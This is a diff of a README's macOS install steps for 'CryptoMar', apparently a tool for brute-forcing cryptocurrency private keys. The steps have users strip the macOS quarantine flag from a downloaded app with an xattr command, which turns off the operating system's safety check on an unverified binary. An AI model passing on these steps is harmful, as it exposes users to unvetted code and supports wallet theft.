@@ -70,17 +70,12 @@ Brute-forcing private keys is a matter of substantial time and computational pow
 ### 🍎 For macOS
 
 1. Open the latest release: [CryptoMar Releases](https://github.com/HexaMar/CryptoMar_EN/releases/tag/v1.1.0)
-
 2. Download the file `CryptoMarAPP.zip`
-
 3. Open the file `CryptoMarAPP.zip` in Download folder
-
 4. Open the terminal, enter the following, and press Enter:
-
    ```bash
    xattr -rd com.apple.quarantine ~/Downloads/CryptoMar.app
    ```
-
 5. Launch the program `CryptoMar.app`
 
 ## ⚡ Paid and Free Versions
